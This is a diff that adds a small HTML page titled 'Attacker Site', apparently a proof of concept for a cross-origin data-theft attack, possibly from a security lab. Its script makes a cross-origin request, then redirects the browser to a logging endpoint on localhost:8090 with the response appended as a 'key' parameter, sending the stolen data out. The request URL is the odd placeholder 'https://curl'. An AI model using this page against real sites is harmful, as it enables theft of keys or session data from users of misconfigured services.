@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>Attacker Site</title>
+    </head>
+    <body>
+        <h1>Attacker Site</h1>
+        <button type="button">Attack!</button>
+    </body>
+</html>
+<script>
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://curl',true); 
+req.send();
+
+function reqListener() {
+    console.log("Listening_");
+    console.log(this.responseText);
+    location='//localhost:8090/log?key='+this.responseText; 
+};
+</script>
